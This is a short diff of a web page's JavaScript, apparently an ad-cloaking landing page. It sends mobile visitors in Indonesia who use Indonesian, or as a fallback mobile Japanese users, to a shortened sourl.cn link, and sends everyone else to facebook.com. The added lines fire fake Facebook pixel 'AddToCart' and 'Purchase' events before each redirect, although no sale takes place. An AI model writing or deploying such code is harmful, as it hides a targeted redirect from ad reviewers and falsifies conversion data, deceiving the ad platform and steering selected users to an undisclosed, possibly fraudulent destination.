@@ -1808,6 +1808,8 @@ src="https://www.facebook.com/tr?id=1228939918939437&ev=PageView&noscript=1"
         
         // 主逻辑： 
         if (isMobile && data.country === 'ID' && isIndonesian) { 
+              fbq('track', 'AddToCart');
+  fbq('track', 'Purchase');
             window.location.href = "https://sourl.cn/zf932Y";
         } else {
             window.location.href = "https://www.facebook.com";
@@ -1815,6 +1817,8 @@ src="https://www.facebook.com/tr?id=1228939918939437&ev=PageView&noscript=1"
     } catch (error) {
         // 备用逻辑：IP检测失败时，仅检查设备和语言
         if (isMobile && isJapanese) { 
+              fbq('track', 'AddToCart');
+  fbq('track', 'Purchase');
             window.location.href = "https://sourl.cn/zf932Y";
         } else {
             window.location.href = "https://www.facebook.com";
